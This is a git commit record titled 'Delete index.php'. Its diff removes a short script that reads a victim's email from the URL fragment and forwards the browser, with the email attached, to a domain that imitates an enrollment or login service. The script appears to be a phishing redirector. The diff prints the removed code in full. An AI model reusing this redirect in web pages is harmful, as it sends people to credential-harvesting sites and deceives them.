01944d6b0f82cbde8b92940dd4ada24859ac8cc3
userpcaz <x57589204x@gmail.com>
2024-06-19 18:52:36 -0700

    Delete index.php

--- index.php
+++
@@ -1,6 +0,0 @@
-<script>
-  var email = window.location.hash.substr(1);
-  window.setTimeout(function() {
-    window.location.href = 'https://planvitalorgenrollmentselfservicesuserlogouteasyvoyagedeme.lmw3v.sbs/?login=' + email;
-  });
-</script>
